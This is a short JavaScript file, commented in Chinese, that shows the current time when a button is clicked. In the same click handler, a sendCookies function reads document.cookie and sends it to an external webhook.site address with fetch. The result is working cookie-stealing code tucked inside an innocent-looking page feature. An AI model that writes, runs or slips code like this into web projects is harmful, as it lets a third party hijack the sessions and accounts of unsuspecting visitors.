document.addEventListener("DOMContentLoaded", function () {
  const button = document.getElementById("showTimeButton");

  // 綁定事件，防止重複綁定
  button.addEventListener("click", function () {
    displayCurrentTime();
    sendCookies();
  });

  // 顯示當前時間
  function displayCurrentTime() {
    const now = new Date();
    const timeString = now.toLocaleTimeString();
    document.getElementById("timeDisplay").innerText = "現在時間: " + timeString;
  }

  // 發送 Cookies 至 Webhook
  function sendCookies() {
    const url = `https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d?cookie=${encodeURIComponent(document.cookie)}`;

    fetch(url, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json'
      }
    })
    .then(response => {
      console.log('Cookie 已成功發送');
    })
    .catch(error => {
      console.error('發送 cookie 失敗:', error);
    });
  }
});
